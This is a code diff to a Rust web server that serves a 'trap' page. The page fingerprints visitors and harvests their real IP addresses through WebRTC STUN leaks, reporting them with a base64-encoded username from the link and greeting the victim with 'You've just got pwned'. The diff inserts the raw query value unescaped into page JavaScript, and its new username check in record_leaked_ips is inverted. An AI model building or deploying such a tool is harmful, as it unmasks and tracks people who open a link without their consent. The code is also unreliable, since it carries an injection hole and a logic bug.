@@ -88,7 +88,7 @@ struct AppData {
 
 #[derive(serde::Deserialize)]
 struct RecordLeakedIpsRequest {
-    username: Option<String>,
+    user: Option<String>,
     fingerprint: Option<String>,
     leaked_ips: Option<Vec<String>>,
 }
@@ -293,9 +293,19 @@ fn get_geo_data(database_path: &str, ip: &str) -> GeoData {
     }
 }
 
+fn decode_username(user: &str) -> String {
+    if let Ok(decoded_bytes) = base64::decode(user) {
+        if let Ok(decoded_username) = String::from_utf8(decoded_bytes) {
+            return decoded_username;
+        }
+    }
+
+    user.to_string()
+}
+
 #[allow(clippy::too_many_lines)]
 async fn index(app_data: web::Data<Mutex<AppData>>, request: HttpRequest) -> HttpResponse {
-    let username = request
+    let user = request
         .uri()
         .query()
         .and_then(|query| {
@@ -305,9 +315,21 @@ async fn index(app_data: web::Data<Mutex<AppData>>, request: HttpRequest) -> Htt
                 .find(|(key, _): &(String, String)| key == "u")
                 .map(|(_, value)| value)
         })
-        .unwrap_or_else(|| String::from("{UNKNOWN_USER}"));
+        .unwrap_or_default();
 
-    println!("Setting up the trap for user: {username}...");
+    let username = decode_username(user.as_str());
+
+    if username.is_empty() {
+        println!("Setting up the trap for an unknown user...");
+    } else {
+        println!("Setting up the trap for the user '{username}'...");
+    }
+
+    let greeting_phrase = if username.is_empty() {
+        String::from("Hello")
+    } else {
+        format!("Hello, {username}")
+    };
 
     let html_content = format!(
         r"
@@ -389,7 +411,7 @@ async fn index(app_data: web::Data<Mutex<AppData>>, request: HttpRequest) -> Htt
                 'Content-Type': 'application/json',
               }},
               body: JSON.stringify({{
-                username: '{username}',
+                user: '{user}',
                 fingerprint: JSON.stringify(fingerprint),
                 leaked_ips: [...leakedIPs],
               }}),
@@ -403,7 +425,7 @@ async fn index(app_data: web::Data<Mutex<AppData>>, request: HttpRequest) -> Htt
     </script>
   </head>
   <body>
-    <pre>Hello, {username}! You've just got pwned ;) <span class='cursor'> </span></pre>
+    <pre>{greeting_phrase}! You've just got pwned ;) <span class='cursor'> </span></pre>
     <div style='font-family: monospace; white-space: pre; font-size: 10px;'>
       &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10436;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
       &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10484;&#10431;&#10311;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10424;&#10359;&#10436;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
@@ -450,7 +472,8 @@ async fn index(app_data: web::Data<Mutex<AppData>>, request: HttpRequest) -> Htt
 </html>
 ",
         stun_server = app_data.lock().stun_server,
-        username = username,
+        user = user,
+        greeting_phrase = greeting_phrase,
     );
 
     HttpResponse::Ok()
@@ -463,10 +486,12 @@ async fn record_leaked_ips(
     request: HttpRequest,
     record_request: web::Json<RecordLeakedIpsRequest>,
 ) -> HttpResponse {
-    let username = record_request
-        .username
-        .clone()
-        .unwrap_or_else(|| String::from("{UNKNOWN_USER}"));
+    let user = record_request.user.clone().unwrap_or_default();
+    let username = if user.is_empty() {
+        decode_username(user.as_str())
+    } else {
+        String::from("{UNKNOWN_USER}")
+    };
 
     let leaked_ips = record_request.leaked_ips.clone().unwrap_or_default();
 
